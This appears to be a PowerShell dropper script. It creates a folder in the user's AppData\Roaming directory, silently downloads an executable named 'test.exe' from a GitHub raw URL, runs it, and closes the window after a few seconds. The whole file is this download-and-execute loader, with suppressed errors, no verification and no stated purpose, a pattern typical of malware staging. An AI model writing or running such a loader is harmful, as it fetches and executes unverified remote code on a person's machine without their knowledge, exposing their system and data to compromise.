# Define variables
$file = "test.exe"
$url = "https://github.com/rspvn/a/raw/main/test.exe"
$folder = "$env:USERPROFILE\AppData\Roaming\test"

# Create folder if it does not exist
if (-not (Test-Path -Path $folder)) {
    New-Item -ItemType Directory -Path $folder | Out-Null
}

# Check if file exists
if (Test-Path -Path "$folder\$file") {
    Start-Process -FilePath "$folder\$file"
    exit
} else {
    # Download file
    Invoke-WebRequest -Uri $url -OutFile "$folder\$file" -ErrorAction SilentlyContinue

    # Check again if file exists after download attempt
    if (Test-Path -Path "$folder\$file") {
        Start-Process -FilePath "$folder\$file"
    } else {
        Write-Output "Download failed."
    }

    # Close PowerShell window after 5 seconds
    Start-Sleep -Seconds 5
    exit
}
